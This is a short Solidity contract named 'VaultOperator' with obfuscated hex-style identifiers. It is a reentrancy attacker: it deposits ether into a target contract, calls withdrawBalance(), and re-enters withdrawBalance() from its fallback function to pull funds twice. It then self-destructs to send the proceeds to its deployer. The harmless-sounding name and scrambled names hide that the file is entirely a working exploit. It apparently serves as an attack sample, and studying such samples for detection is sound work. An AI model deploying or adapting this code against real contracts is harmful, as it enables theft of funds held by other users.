// SPDX-License-Identifier: MIT
pragma solidity ^0.4.15;

contract VaultOperator {
    bool public _0x6c4e82=false;
    address public _0xfedf2e;
    address public _0xbcd4f1;

    function VaultOperator() public{
        _0xbcd4f1 = msg.sender;
    }

    function _0xbfe9d2(address _0x4730cc) public payable{
        _0xfedf2e = _0x4730cc ;
        // call addToBalance with msg.value ethers
        require(_0xfedf2e.call.value(msg.value)(bytes4(_0x9dcf0f("addToBalance()"))));
    }

    function _0xb55834() public{
        _0x6c4e82 = true;
        // call withdrawBalance

        require(_0xfedf2e.call(bytes4(_0x9dcf0f("withdrawBalance()"))));
    }

    function () public payable{

        if (_0x6c4e82){
            _0x6c4e82 = false;
                require(_0xfedf2e.call(bytes4(_0x9dcf0f("withdrawBalance()"))));
        }
    }

    function _0x745269(){
        suicide(_0xbcd4f1);
    }

}